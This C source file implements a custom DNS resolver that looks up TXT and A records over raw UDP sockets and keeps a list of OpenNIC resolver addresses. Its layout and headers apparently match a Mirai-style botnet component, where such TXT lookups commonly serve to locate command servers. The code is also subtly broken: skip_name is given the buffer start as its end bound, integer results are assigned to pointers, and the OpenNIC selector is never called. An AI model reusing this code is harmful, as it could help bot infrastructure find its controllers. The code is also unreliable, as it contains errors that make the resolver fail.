#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "includes.h"
#include "protocol.h"
#include "rand.h"
#include "resolv.h"
#include "util.h"

int opennic_resolver() {
  int random = rand_next() % 11;
  switch (random) {
    case 0:
      return INET_ADDR(116, 203, 104, 203);
    case 1:
      return INET_ADDR(130, 61, 64, 122);
    case 2:
      return INET_ADDR(161, 97, 219, 84);
    case 3:
      return INET_ADDR(130, 61, 69, 123);
    case 4:
      return INET_ADDR(185, 84, 81, 194);
    case 5:
      return INET_ADDR(54, 36, 111, 116);
    case 6:
      return INET_ADDR(192, 3, 165, 37);
    case 7:
      return INET_ADDR(162, 243, 19, 47);
    case 8:
      return INET_ADDR(63, 231, 92, 27);
    case 9:
      return INET_ADDR(80, 152, 203, 134);
    case 10:
      return INET_ADDR(116, 203, 104, 203);
  }
}

int _clearnet_dns() {
  int random = rand_next() % 4;
  switch (random) {
    case 0:
      return INET_ADDR(8, 8, 8, 8);
    case 1:
      return INET_ADDR(8, 8, 4, 4);
    case 2:
      return INET_ADDR(208, 67, 222, 222);
    case 3:
      return INET_ADDR(208, 67, 220, 220);
  }
}

int construct_query(const char *domain, unsigned char *query, size_t query_size) {
  struct DNSHeader *dns = (struct DNSHeader *)query;
  memset(query, 0, query_size);

  srand(time(NULL));

  dns->id = htons(rand_next() % 0xFFFF); // generate random 16-bit ID
  dns->qr = 0;
  dns->opcode = 0;
  dns->aa = 0;
  dns->tc = 0;
  dns->rd = 1;
  dns->ra = 0;
  dns->z = 0;
  dns->rcode = 0;
  dns->q_count = htons(1);

  unsigned char *qname = query + sizeof(struct DNSHeader);
  const char *start = domain;

  while (*start) {
    const char *dot = strchr(start, '.');
    if (!dot) dot = start + strlen(start);
    *qname++ = dot - start;
    memcpy(qname, start, dot - start);
    qname += dot - start;
    start = (*dot) ? dot + 1 : dot;
  }

  *qname++ = 0;

  struct Question *qinfo = (struct Question *)qname;
  qinfo->qtype = htons(16);
  qinfo->qclass = htons(1);

  return qname - query + sizeof(struct Question);
}

// https://github.com/bminor/musl/blob/master/src/network/dn_skipname.c
int skip_name(const unsigned char *s, const unsigned char *end) {
  const unsigned char *p = s;
  while (p < end)
    if (!*p)
      return p - s + 1;
    else if (*p >= 192)
      if (p + 1 < end)
        return p - s + 2;
      else
        break;
    else if (end - p < *p + 1)
      break;
    else
      p += *p + 1;
  return -1;
}

char *parse_txt_record(unsigned char *response, int response_size) {
  struct DNSHeader *dns = (struct DNSHeader *)response;
  unsigned char *reader = response + sizeof(struct DNSHeader);

  // Skip the question section
  int r = skip_name(reader, response);
  if (r <= 0) {
#ifdef DEBUG
    printf("[resolv] Failed to skip name in question section\n");
#endif
    return NULL;
  }

  reader += r + sizeof(struct Question);

  for (int i = 0; i < ntohs(dns->ans_count); i++) {
#ifdef DEBUG
    // printf("[resolv] Parsing answer %d\n", i + 1);
#endif
    reader = skip_name(reader, response);
    if (!reader) {
#ifdef DEBUG
      printf("[resolv] Failed to skip name in answer section\n");
#endif
      return NULL;
    }
    unsigned short type = ntohs(*(unsigned short *)reader);
#ifdef DEBUG
    // printf("[resolv] Type: %u\n", type);
#endif
    reader += 2; // Move past type
    reader += 2; // Skip class
    reader += 4; // Skip TTL
    unsigned short data_len = ntohs(*(unsigned short *)reader);

#ifdef DEBUG
    // printf("[resolv] Data length: %u\r\n", data_len);
#endif

    reader += 2;

    if (type == 16) {
      unsigned char *end = reader + data_len;
      char *txt_record = malloc(data_len + 1);

      if (!txt_record) {
#ifdef DEBUG
        printf("[resolv] Memory allocation failed\n");
#endif
        return NULL;
      }

      char *dst = txt_record;

      while (reader < end) {
        int txt_len = *reader++;
        memcpy(dst, reader, txt_len);
        dst += txt_len;
        reader += txt_len;
      }
      *dst = '\0';
#ifdef DEBUG
      // printf("[resolv] TXT record: %s\r\n", txt_record);
#endif
      return txt_record;
    }
    reader += data_len;
  }

#ifdef DEBUG
  printf("[resolv] No TXT records found\r\n");
#endif

  return NULL;
}

char *lookup_txt_record(const char *domain) {
  unsigned char query[512];
  unsigned char response[512];
  int max_retries = 3;
  int retries = 0;

#ifdef DEBUG
  printf("[resolv] Using domain: %s\r\n", domain);
#endif

  while (retries < max_retries) {
    int query_len = construct_query(domain, query, sizeof(query));
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (sock < 0) {
#ifdef DEBUG
      printf("[resolv] Socket creation failed\n");
#endif
      retries++;
      continue;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(53);
    server.sin_addr.s_addr = INET_ADDR(1, 1, 1, 1);

    if (sendto(sock, query, query_len, 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
#ifdef DEBUG
      printf("[resolv] Failed to send query\n");
#endif
      close(sock);
      retries++;
      continue;
    }

    // Use poll to wait for a response with a timeout
    struct pollfd fds;
    fds.fd = sock;
    fds.events = POLLIN;
    int timeout_ms = 2000; // 2-second timeout

    int poll_res = poll(&fds, 1, timeout_ms);

    if (poll_res == 0) {
#ifdef DEBUG
      printf("[resolv] Timeout waiting for response\n");
#endif
      close(sock);
      retries++;
      continue;
    } else if (poll_res < 0) {
#ifdef DEBUG
      printf("[resolv] Poll error\n");
#endif
      close(sock);
      retries++;
      continue;
    }

    // If poll indicates data is available, receive the response
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    int response_size =
        recvfrom(sock, response, sizeof(response), 0, (struct sockaddr *)&from, &from_len);

    close(sock);

    if (response_size < 0) {
#ifdef DEBUG
      printf("[resolv] Failed to receive response\n");
#endif
      retries++;
      continue;
    }

    char *txt_record = parse_txt_record(response, response_size);
    if (txt_record != NULL) {
#ifdef DEBUG
      printf("[resolv] Successfully retrieved TXT record\n");
#endif
      return txt_record;
    } else {
#ifdef DEBUG
      printf("[resolv] Malformed or no TXT record found\n");
#endif
      retries++;
      continue;
    }
  }

#ifdef DEBUG
  printf("[resolv] All retry attempts failed\n");
#endif
  return NULL;
}

char *lookup_txt_icann_record(const char *domain) {
  unsigned char query[512];
  unsigned char response[512];
  int max_retries = 3;
  int retries = 0;

#ifdef DEBUG
  printf("[resolv] Using domain: %s\r\n", domain);
#endif

  while (retries < max_retries) {
    int query_len = construct_query(domain, query, sizeof(query));
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (sock < 0) {
#ifdef DEBUG
      printf("[resolv] Socket creation failed\n");
#endif
      retries++;
      continue;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(53);
    server.sin_addr.s_addr = INET_ADDR(1, 1, 1, 1);

    if (sendto(sock, query, query_len, 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
#ifdef DEBUG
      printf("[resolv] Failed to send query\n");
#endif
      close(sock);
      retries++;
      continue;
    }

    // Use poll to wait for a response with a timeout
    struct pollfd fds;
    fds.fd = sock;
    fds.events = POLLIN;
    int timeout_ms = 2000; // 2-second timeout

    int poll_res = poll(&fds, 1, timeout_ms);

    if (poll_res == 0) {
#ifdef DEBUG
      printf("[resolv] Timeout waiting for response\n");
#endif
      close(sock);
      retries++;
      continue;
    } else if (poll_res < 0) {
#ifdef DEBUG
      printf("[resolv] Poll error\n");
#endif
      close(sock);
      retries++;
      continue;
    }

    // If poll indicates data is available, receive the response
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    int response_size =
        recvfrom(sock, response, sizeof(response), 0, (struct sockaddr *)&from, &from_len);

    close(sock);

    if (response_size < 0) {
#ifdef DEBUG
      printf("[resolv] Failed to receive response\n");
#endif
      retries++;
      continue;
    }

    char *txt_record = parse_txt_record(response, response_size);
    if (txt_record != NULL) {
#ifdef DEBUG
      printf("[resolv] Successfully retrieved TXT record\n");
#endif
      return txt_record;
    } else {
#ifdef DEBUG
      printf("[resolv] Malformed or no TXT record found\n");
#endif
      retries++;
      continue;
    }
  }

#ifdef DEBUG
  printf("[resolv] All retry attempts failed\n");
#endif
  return NULL;
}

// CLEARNET DNS A records

int generate_query(const char *domain, unsigned char *query, size_t query_size) {
  struct DNSHeader *dns = (struct DNSHeader *)query;
  memset(query, 0, query_size);

  srand(time(NULL));

  dns->id = htons(rand_next() % 0xFFFF); // generate random 16-bit ID
  dns->qr = 0;
  dns->opcode = 0;
  dns->aa = 0;
  dns->tc = 0;
  dns->rd = 1;
  dns->ra = 0;
  dns->z = 0;
  dns->rcode = 0;
  dns->q_count = htons(1);

  unsigned char *qname = query + sizeof(struct DNSHeader);
  const char *start = domain;

  while (*start) {
    const char *dot = strchr(start, '.');
    if (!dot) dot = start + strlen(start);
    *qname++ = dot - start;
    memcpy(qname, start, dot - start);
    qname += dot - start;
    start = (*dot) ? dot + 1 : dot;
  }

  *qname++ = 0;

  struct Question *qinfo = (struct Question *)qname;
  qinfo->qtype = htons(1); // Set to 1 for A record (IPv4 address)
  qinfo->qclass = htons(1);

  return qname - query + sizeof(struct Question);
}

char *parse_a_record(unsigned char *response, int response_size) {
  struct DNSHeader *dns = (struct DNSHeader *)response;
  unsigned char *reader = response + sizeof(struct DNSHeader);

  // Skip the question section
  reader = skip_name(reader, response);
  if (!reader) {
#ifdef DEBUG
    printf("[resolv] Failed to skip name in question section\n");
#endif
    return NULL;
  }
  reader += sizeof(struct Question);

  for (int i = 0; i < ntohs(dns->ans_count); i++) {
#ifdef DEBUG
    // printf("[resolv] Parsing answer %d\n", i + 1);
#endif
    reader = skip_name(reader, response);
    if (!reader) {
#ifdef DEBUG
      printf("[resolv] Failed to skip name in answer section\n");
#endif
      return NULL;
    }
    unsigned short type = ntohs(*(unsigned short *)reader);
#ifdef DEBUG
    // printf("[resolv] Type: %u\n", type);
#endif
    reader += 2; // Move past type
    reader += 2; // Skip class
    reader += 4; // Skip TTL
    unsigned short data_len = ntohs(*(unsigned short *)reader);

#ifdef DEBUG
    // printf("[resolv] Data length: %u\r\n", data_len);
#endif

    reader += 2;

    if (type == 1) // A record (IPv4 address)
    {
      if (data_len != 4) {
#ifdef DEBUG
        printf("[resolv] Invalid A record length\n");
#endif
        return NULL;
      }

      unsigned char *ip = reader;
      char *ip_str = malloc(16); // Max length of IPv4 address (xxx.xxx.xxx.xxx\0)

      if (!ip_str) {
#ifdef DEBUG
        printf("[resolv] Memory allocation failed\n");
#endif
        return NULL;
      }

      snprintf(ip_str, 16, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
#ifdef DEBUG
      // printf("[resolv] A record: %s\r\n", ip_str);
#endif
      return ip_str;
    }
    reader += data_len;
  }

#ifdef DEBUG
  printf("[resolv] No A records found\r\n");
#endif

  return NULL;
}

char *lookup(const char *domain) {
  unsigned char query[512];
  unsigned char response[512];
  int max_retries = 3;
  int retries = 0;

#ifdef DEBUG
  printf("[resolv] Using domain: %s\r\n", domain);
#endif

  while (retries < max_retries) {
    int query_len = generate_query(domain, query, sizeof(query));
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (sock < 0) {
#ifdef DEBUG
      printf("[resolv] Socket creation failed\n");
#endif
      retries++;
      continue;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(53);
    server.sin_addr.s_addr = _clearnet_dns(); // Google's DNS

    if (sendto(sock, query, query_len, 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
#ifdef DEBUG
      printf("[resolv] Failed to send query\n");
#endif
      close(sock);
      retries++;
      continue;
    }

    // Use poll for precise timeout handling
    struct pollfd fds;
    fds.fd = sock;
    fds.events = POLLIN;
    int timeout_ms = 2000; // 2 seconds

    int poll_res = poll(&fds, 1, timeout_ms);

    if (poll_res == 0) {
#ifdef DEBUG
      printf("[resolv] Timeout waiting for response\n");
#endif
      close(sock);
      retries++;
      continue;
    } else if (poll_res < 0) {
#ifdef DEBUG
      printf("[resolv] Poll error\n");
#endif
      close(sock);
      retries++;
      continue;
    }

    // If poll indicates data is available, receive the response
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    int response_size =
        recvfrom(sock, response, sizeof(response), 0, (struct sockaddr *)&from, &from_len);

    close(sock);

    if (response_size < 0) {
#ifdef DEBUG
      printf("[resolv] Failed to receive response\n");
#endif
      retries++;
      continue;
    }

    char *ip_address = parse_a_record(response, response_size);
    if (ip_address != NULL) {
#ifdef DEBUG
      printf("[resolv] Successfully retrieved A record\n");
#endif
      return ip_address;
    } else {
#ifdef DEBUG
      printf("[resolv] Malformed or no A record found\n");
#endif
      retries++;
      continue;
    }
  }

#ifdef DEBUG
  printf("[resolv] All retry attempts failed\n");
#endif
  return NULL;
}
